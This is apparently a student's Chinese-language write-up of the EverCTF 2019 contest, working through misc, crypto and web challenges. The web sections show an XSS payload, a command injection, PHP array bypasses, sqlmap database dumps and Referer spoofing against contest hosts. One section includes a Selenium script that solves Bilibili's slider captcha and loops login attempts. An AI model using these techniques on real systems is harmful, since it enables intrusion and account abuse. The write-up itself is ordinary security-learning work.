---
layout: post
title: EverCTF_2019 WriteUp
tags:
  - CTF
  - USTB
  - EverCTF
comments: true
# abstract: 文章已加密，密码见提示
# message: 我老家最好的朋友的名字
# password: 陈海龙
top: 10
copyright: true
# description: 你对本页的描述，也可以使用 <!-- more--> 手动指定
translate_title: everctf2019-writeup
date: 2019-04-01 12:01:24
categories:
  - CTF
---
{% note warning %}
EverCTF 是北京科技大学第二届 CTF 校赛, 花了一周的时间练练一些题, 菜鸡一枚. 过去水了水
{% endnote %}
<!-- more -->

## Misc

### jigsaw

二维码拼图, 还需要反转一下颜色.
![](2019-04-01-10-13-03.png)
扫描得到 flag
> everctf{qR_c0de_1s_g00d}

### 玛尔博吉

打开文件, 复制代码, 粘贴到 [这里](http://www.compileonline.com/execute_malbolge_online.php), 运行即得到 flag
> everctf{m41b0lge_1s_4maz1ing}

### 俄罗斯套包

解压后不断得到新的压缩包, 气到了, 直接 winhex 打开, 搜索 flag, 找到最后一个,
![](2019-04-01-10-18-59.png)
将最后的片段新建保存, 解压, 打开, 得到 txt, 打开得到 flag.
![](2019-04-01-10-19-27.png)
> everctf{z1P_z4p_Z1p_zap}

### 永远也猜不到的密码

这个题是真的有趣, 打开压缩包, 打开 word, 启用编辑, 然后
![](2019-04-01-10-20-00.png)
是的, 没错！word 提示了拼写错误！！！感谢巨硬, 一直被我 diss 的拼写检查还是有功的！！
so, 直接全选, 复制, 粘贴, 搞定, 不带走云彩.
> everctf{The_m05t_d4nger0u5 _1s_the_s4fe5t}

### 红玫瑰与白玫瑰

没说的, 直接 binwalk, 看到
![](2019-04-01-10-34-21.png)
自动分离后, 得到的东西有点点难受
![](2019-04-01-10-36-10.png)
想着是不是里面改了文件头, 于是 WinHex 修改
。。。
然并卵, 暂时跳过
有提示了, LSB, 打开 StegSolve 一阵乱点, 还是没用。。。放弃
(后来知道是 bgr。。。没用乱点这个。。。最开始还以为红玫瑰与白玫瑰, 是要把两张图片做与然后找 LSB 呢。。。)

### 心跳加速

Github 上找代码, 然而能够运行的准确率不高, 据说准确率高的却不能运行。。。真的是相当难受了
还是硬刚吧, 把能够运行的代码改了改, 然后就只需要自己拼图了
在尝试了估计有 300 多次的拼图后, 终于第 262 个找到了
账号是: fdddbdbfbb973
来看看这句诗是什么呢?
![](2019-04-02-16-48-44.png)
切, 我还以为是 "苟利国家生死以" 的英语版呢。。。
可以说是十分羡慕那些全程用代码实现的 dalao 了, 要不是 dalao 鼓励说不超过 300, 我还真的就不想拼图了
最后, 这道题告诉我, 拼图还是很好玩的, 尤其是在无聊的情况下 (手动黑脸. jpg)
附修改后的手动拼图代码

```Python
import random
import time
from io import BytesIO
from PIL import Image
from selenium import webdriver
from selenium.common.exceptions import TimeoutException
from selenium.webdriver import ActionChains
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC


USER_NAME = ''  # 账户
PASSWORD = 'qqq111'  # 密码
MULTIPE = 1.5  # 显示比例，我这里是 150%
BORDER = 6  # 滑块左侧在验证码图片上的 x 轴坐标为 6


class CrackBili(object):
    def __init__(self):
        self.url = 'https://passport.bilibili.com/login'
        self.browser = webdriver.Chrome()
        self.browser.maximize_window()
        self.wait = WebDriverWait(self.browser, 10)
        self.wait_pass = WebDriverWait(self.browser, 1)
        self.user_name = USER_NAME
        self.password = PASSWORD

    def __del__(self):
        self.browser.close()

    def get_slider(self):
        """
        获取滑块
        :return: 滑块对象
        """
        slider = self.wait.until(EC.element_to_be_clickable((By.CLASS_NAME, 'gt_slider_knob')))
        return slider

    def get_position(self):
        """
        获取验证码位置
        :return: 验证码位置元组
        """
        img = self.wait.until(EC.presence_of_element_located((By.CLASS_NAME, 'gt_box')))
        time.sleep(2)
        location = img.location
        size = img.size
        top, bottom, left, right = location['y'], location['y'] + size['height'], location['x'], location['x'] + size[
            'width']
        return (top, bottom, left, right)

    def get_screenshot(self):
        """
        获取网页截图
        :return: 截图对象
        """
        screenshot = self.browser.get_screenshot_as_png()
        screenshot = Image.open(BytesIO(screenshot))
        return screenshot

    def get_bili_image(self, name='captcha.png'):
        """
        获取验证码图片
        :return: 图片对象
        """
        top, bottom, left, right = self.get_position()
        print('验证码位置', left, top, right, bottom)
        screenshot = self.get_screenshot()
        captcha = screenshot.crop(map(lambda x: int(x * MULTIPE), (left, top, right, bottom)))
        captcha.save(name)
        return captcha

    def open(self):
        """
        打开网页输入用户名密码
        :return: None
        """
        self.browser.get(self.url)
        user_name = self.wait.until(EC.presence_of_element_located((By.ID, 'login-username')))
        password = self.wait.until(EC.presence_of_element_located((By.ID, 'login-passwd')))
        user_name.send_keys(self.user_name)
        password.send_keys(self.password)

    def close(self):
        self.browser.close()

    def get_gap(self, image1, image2):
        """
        获取缺口偏移量
        :param image1: 不带缺口图片
        :param image2: 带缺口图片
        :return:
        """
        left = int(60 * MULTIPE)  # 滑块最右测在验证码图片上的 x 坐标为 60
        for i in range(left, image1.size[0]):
            for j in range(image1.size[1]):
                if not self.is_pixel_equal(image1, image2, i, j):
                    left = i
                    return left
        return left

    def is_pixel_equal(self, image1, image2, x, y):
        """
        判断两个像素是否相同
        :param image1: 图片 1
        :param image2: 图片 2
        :param x: 位置 x
        :param y: 位置 y
        :return: 像素是否相同
        """
        # 取两个图片的像素点
        pixel1 = image1.load()[x, y]
        pixel2 = image2.load()[x, y]
        threshold = 60
        if abs(pixel1[0] - pixel2[0]) < threshold and abs(pixel1[1] - pixel2[1]) < threshold and abs(
                pixel1[2] - pixel2[2]) < threshold:
            return True
        else:
            return False

    def get_track(self, distance):
        """
        根据偏移量获取移动轨迹
        一开始加速，然后减速，生长曲线，且加入点随机变动
        :param distance: 偏移量
        :return: 移动轨迹
        """
        # 移动轨迹
        track = []
        # 当前位移
        current = 0
        # 减速阈值
        mid = distance * 3 / 4
        # 间隔时间
        t = 0.10
        v = 0
        while current < distance:
            if current < mid:
                a = random.randint(2, 3)
            else:
                a = - random.randint(6, 7)
            v0 = v
            v = v0 + a * t
            move = v0 * t + 1 / 2 * a * t * t
            current += move
            track.append(round(move))
        return track

    def move_to_gap(self, slider, track):
        """
        拖动滑块到缺口处
        :param slider: 滑块
        :param track: 轨迹
        :return:
        """
        ActionChains(self.browser).click_and_hold(slider).perform()
        for x in track:
            ActionChains(self.browser).move_by_offset(xoffset=x, yoffset=0).perform()
        time.sleep(0.5)
        ActionChains(self.browser).release().perform()

    def login(self):
        """
        登录
        :return: None
        """
        submit = self.wait.until(EC.element_to_be_clickable((By.CLASS_NAME, 'btn-login')))
        submit.click()
        time.sleep(7)
        print('登录成功')
        self.close()

    def refresh(self):
        refresh = self.wait.until(EC.element_to_be_clickable((By.CLASS_NAME, 'gt_refresh_button')))
        refresh.click()

    def crack(self, slider):
        # 将鼠标移至滑块对象
        ActionChains(self.browser).move_to_element(slider).perform()
        # 获取验证码图片
        image1 = self.get_bili_image('captcha1.png')
        ActionChains(self.browser).click_and_hold(slider).perform()
        # 获取带缺口的验证码图片
        image2 = self.get_bili_image('captcha2.png')
        # 获取缺口位置
        gap = self.get_gap(image1, image2)
        # 截图中是 150% 的距离，要除掉
        gap = int(gap / MULTIPE)
        print('缺口位置', gap)
        # 减去缺口位移
        gap -= BORDER
        # 获取移动轨迹
        track = self.get_track(gap)
        print('滑动轨迹', track)
        # 拖动滑块
        self.move_to_gap(slider, track)
        try:
            success = self.wait_pass.until(
                EC.text_to_be_present_in_element((By.CLASS_NAME, 'gt_info_text'), '验证通过'))
            print(success)
        except TimeoutException:
            success = None

        # 失败后重试
        if not success:
            ActionChains(self.browser).move_to_element(slider).perform()
            self.refresh()
            self.crack(slider)
        else:
            self.login()


if __name__ == '__main__':
    # 创建实例
    # 输入用户名密码
    # crack.name = 'hfjhjhhjfh595'
    f = open('ctf.txt', 'r')
    i = 1
    for line in f:
        crack = CrackBili()
        crack.user_name = line
        print('第' + str(i) + '次尝试, username=', crack.user_name)
        i += 1
        crack.open()
        time.sleep(4)
        crack.login()
        # crack.close()
        print('开始下一次的尝试')
        time.sleep(2)
    f.close()
    # # 获取滑块对象
    # slider = crack.get_slider()
    # crack.crack(slider)

```

## Re

直接拖入 IDA, 然后
![](2019-04-02-11-56-54.png)
太简单了吧。。。
> flag{123_Buff3r_0v3rf|0w}

## Pwn

没经验, 不会, 不了解

## Ppc

跳过

## Blockchain

跳过 (没错, 与易经相关的都跳过)

### cockroach

查看源码, 颜文字加密。。。复制粘贴控制台, 报错, 无 web3, 放弃。。。

## Crypto

### 足够安全的 RSA

复制粘贴了两次 N, 电脑死机了两次。。。
然后在 Github 上找到了不需要复制粘贴的工具 ([CTF-RSA-Tools](https://github.com/3summer/CTF-RSA-tool), 配好了 RSA 的环境, 结果还是解不开。。。相当真实
后来想到 e=23, 可以用小 e 模式的, 然而 N 太长, 唉, 早知道当时写脚本了。。。怪我不该偷懒 (其实是有其他事情, 没时间搞了)

### 侠客行

虽然我是金庸武侠迷, 但是, 侠客行我真的没有看过. 跳过

### RSA 共模

看我用之前配好的环境!!!
三行命令搞定这个题
先从公钥文件中获取参数, 再将文件写成标准格式 (工具规定的), 然后运行, 搞定, 大功告成!
![](2019-04-02-18-59-40.png)
懒得贴了
<!--> falg{61} -->

## Web

### 欢迎来参加比赛

群公告, 然后 base64 解码
就不贴了, 不坏了规矩 (这句话是我从别人的 wp 中看到的, 太有逼格了)

### 签到题

构造 `ustb.ever404.com:30000/index.php?a=xss<script>alert(1)</script>`(Hackbar 自带的)
> everctf{X5s_1s_cr4zy}

### ping?

暂时没看懂题目

---

噢噢, 在 dalao 的提示下, 知道了原来是命令注入。。。输入 `127.0.0.1 && ls`
![](2019-04-01-11-10-19.png)
还有什么说的呢? 输入 `127.0.0.1 && cat flag`
![](2019-04-01-11-19-45.png)
> everctf{6e_carefu1_4bout_exec}

### 猜密码

暴力用数组的方式解决 (好几个题都这么暴力解决了, 估计出题人没有想到吧)
构造 http://ustb.ever404.com:30011/index.php?password[]=
> everctf{5trcmp_1s_we4k}

### 点我一下就给你 flag

Ctrl+U 查看源码发现一大堆读不懂的东西, 还有 `sojson.v5` 的提示, 于是百度了一下, 过去后解码还是发现有问题。。。好吧, 难受
抓包吧? 好! 发现禁止了一大堆的东西。。。
代理吧? 可! 发现并没有发包。。。
再看页面, flag 已经给我了???what??? 不发包居然给我了!!!
好吧, `ctrl+s ` 将网页存到本地, 打开, 然后。。。
![](2019-04-01-11-22-05.png)
你很强嘛!! 果然是签到题。。。
> everctf{c0ns0le_1s_g00d}

### 注入热身

没环境, 暂时没做.

---
好了现在开 Kali 了, sqlmap 全自动

* 获取当前使用的数据库

```sh
python sqlmap -u http://ustb.everctf.com:30009/?id=1 --current-db

```

![](2019-04-01-11-50-43.png)

* 获取当前使用的数据库的所有数据表

```sh
python sqlmap -u http://ustb.everctf.com:30009/?id=1 -D sqli --tables
```

![](2019-04-01-11-50-09.png)

* 显示当前数据表的所有值

```sh
python sqlmap -u http://ustb.everctf.com:30009/?id=1 -D sqli -T flag --dump
```

![](2019-04-01-11-49-21.png)

好了, 大功告成

### 否认三连

查看源代码, 好吧, 代码审计。。。
还是一样的, 用数组暴力解决
构造 http://ustb.ever404.com:30012/index.php?justify1=wobushi&justify2[]=womeiyou&justify3[]=nibieluanshuoa&mark[]=
> everctf{pHp_C4n_Be_d4n9er0us}

### 404 的危机

打开控制台, 发现一个人的 qq, 看空间, 说说一条链接为
http://url.cn/5E6Ke7l
然而, 打不开啊!!!
好吧所谓的打开方式不对, 用浏览器打开, 得到一串很奇怪的网址: http://mat23kcc6hwgk3vx.onion/neo/uploads/190329/MATRIX_104334_QPK_second.jpg
看不懂这串网址。。。

---
算了, 再努力一次. 这一次, 重新打开
![](2019-04-02-17-04-55.png)
md, 图床挂了。。。是的挂了。。。
扫描二维码获得 flag
> flag{7861495462475a393747634a6e686c41436f57766c413d3d}
我特么还以为又是一串密文, 还想了一下要不要解密, 结果试了一下, 过了。。。

### 绝对安全的 blog

最后一篇日记得知后台登录链接：
http://ustb.ever404.com:30003/adm1n/index.php
查看源码, 得知表单处理链接为
http://ustb.ever404.com:30003/adm1n/akjahdahdia.php
而后通过随便构造用户名密码, 发包, 在响应里看到
![](2019-04-01-11-52-42.png)
于是得到了前半段
> everctf{rkl_1

以及搜索的替换规则——
> \>、< 依次被删掉, 而后替换 < script 为 < scr_ipt, 再替换 on 为 o_n, 最后输出.
虽然我也没能够搜索到后半段.

---
好了改题了, 现在是这个界面
![](2019-04-01-11-53-35.png)
好了, 那现在就简单了.
既然是从 USTB 官网来, 那么添加 Referrer 参数为 https://www.ustb.edu.cn 即可得到.
![](2019-04-01-11-55-41.png)
PS: 最开始的时候没看到 USTB。。。然后构造的是 https://www.ever404.com
> everctf{rkl_1S_50_14j1}

---

> 最后, 成绩还行, 虽然有 dalao 的鼓励和提示。
还好, 接触了一周左右就参赛, 还一半时间摸鱼 hhhhhh
![](2019-04-03-00-38-52.png)
以后再加油, 速成的, 到底还是见识太少
